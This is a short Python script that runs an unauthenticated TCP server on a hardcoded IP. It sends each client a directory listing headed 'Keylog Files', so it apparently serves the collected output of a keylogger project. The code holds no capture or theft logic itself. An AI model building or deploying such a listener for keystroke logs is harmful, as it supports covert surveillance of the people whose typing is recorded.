#File Sever
import socket
import os
import fileinput
import sys

#setting up the server
tcp_port = 25006
buffer_size = 1024
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '35.196.2.248' #this is our server's static IP
serversocket.bind((host, tcp_port))

#listening for a connection and accepting it
print("Server started on " + host + " on port " + str(tcp_port) + "\n")
serversocket.listen()

while(True):
    connection, address = serversocket.accept()
    print ('Connected to ', address)
    #displaying the directory
    print ('Sending directory information...')
    directory_data = os.listdir()
    data = "====Keylog Files====\n" + "\n".join(directory_data)
    connection.send(data.encode())
    connection.close()

serversocket.close()
